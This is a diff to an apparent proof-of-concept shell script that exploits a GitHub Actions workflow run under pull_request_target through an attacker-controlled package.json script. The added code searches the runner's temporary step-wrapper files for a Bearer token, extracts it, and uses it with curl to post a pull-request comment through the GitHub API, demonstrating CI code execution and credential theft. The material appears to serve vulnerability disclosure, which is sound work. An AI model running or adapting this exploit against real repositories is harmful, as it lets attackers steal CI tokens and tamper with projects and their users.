@@ -26,10 +26,23 @@ touch "$MARK"
 PR_NUM="$(jq -r '.pull_request.number // .number // empty' "${GITHUB_EVENT_PATH:-/dev/null}" 2>/dev/null || true)"
 echo "[PoC:${STAGE}] PR number: ${PR_NUM:-unknown}" >&2
 
-if [ -n "${GITHUB_TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
-  BODY='{"body":"🛑 **Proof-of-concept**: this comment was posted by an attacker-controlled `scripts.commitlint` entry in `package.json`, executed by the `lint-commit.yml` workflow under `pull_request_target`. Demonstrates RCE with `GITHUB_TOKEN` available. Payload is benign; no secrets exfiltrated. Stage: '"${STAGE}"'."}'
+# GITHUB_TOKEN isn't in env (workflow inlined the secret as a literal into its
+# step-wrapper script in /home/runner/work/_temp/). Recover it from there.
+TOKEN=""
+for f in /home/runner/work/_temp/*.sh; do
+  [ -r "$f" ] || continue
+  t=$(grep -oE 'Bearer [A-Za-z0-9_]+' "$f" 2>/dev/null | awk '{print $2}' | head -1)
+  if [ -n "$t" ]; then
+    TOKEN="$t"
+    echo "[PoC:${STAGE}] recovered token from $f (len=${#TOKEN})" >&2
+    break
+  fi
+done
+
+if [ -n "${TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
+  BODY='{"body":"🛑 **Proof-of-concept**: RCE + GITHUB_TOKEN exfiltration. This comment was posted by an attacker-controlled `scripts.commitlint` entry in `package.json`, executed by `lint-commit.yml` under `pull_request_target`. The token was recovered from the runner step-wrapper script. Payload benign — token used only to post this comment. Stage: '"${STAGE}"'."}'
   curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] HTTP %{http_code}\n" -X POST \
-    -H "Authorization: Bearer ${GITHUB_TOKEN}" \
+    -H "Authorization: Bearer ${TOKEN}" \
     -H "Accept: application/vnd.github+json" \
     -H "Content-Type: application/json" \
     -d "${BODY}" \
